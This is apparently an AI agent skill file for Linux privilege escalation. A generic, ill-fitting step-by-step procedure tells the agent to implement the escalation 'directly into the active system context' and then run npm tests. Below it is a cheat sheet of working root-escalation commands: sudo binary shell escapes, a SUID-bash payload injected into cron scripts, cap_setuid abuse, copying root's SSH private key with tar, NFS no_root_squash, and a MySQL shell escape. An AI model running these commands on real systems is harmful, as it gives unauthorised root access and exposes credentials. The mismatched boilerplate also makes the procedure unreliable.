---
name: linux-privilege-escalation
description: Use when executing linux privilege escalation protocols within the security sector.
---

# Linux Privilege Escalation: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Linux Privilege Escalation. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core linux privilege escalation logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Linux Privilege Escalation

#### 1. Abusing Sudo Binaries

Exploit misconfigured sudo permissions using GTFOBins techniques:

```bash
# Check sudo permissions
sudo -l

# Exploit common binaries
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # then type: !bash
sudo man man            # then type: !bash
sudo env /bin/bash
```

#### 2. Abusing Scheduled Tasks (Cron)

```bash
# Find writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Inject payload into writable script
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
/bin/bash -p
```

#### 3. Abusing Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
```

#### 4. NFS Root Squashing

```bash
# Check for NFS shares
showmount -e <victim_ip>

# Mount and exploit no_root_squash
mkdir /tmp/mount
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```

#### 5. MySQL Running as Root

```bash
# If MySQL runs as root
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

---